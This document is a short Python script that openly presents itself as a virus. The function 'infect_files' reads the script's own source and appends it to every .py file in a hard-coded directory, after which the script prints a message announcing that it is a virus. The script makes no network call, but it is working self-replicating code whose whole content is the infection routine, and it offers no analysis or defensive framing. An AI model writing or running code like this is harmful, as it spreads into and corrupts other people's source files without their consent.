import os
import shutil
import sys

def infect_files(directory):
    virus_code = open(sys.argv[0], 'r').read()
    files = os.listdir(directory)
    for file in files:
        if file.endswith('.py'):
            with open(os.path.join(directory, file), 'a') as f:
                f.write(virus_code)

def main():
    # Code executed by the virus
    print("This is a virus!")

if __name__ == '__main__':
    # Code to spread the virus
    infect_files('D:/fuck')
    main() 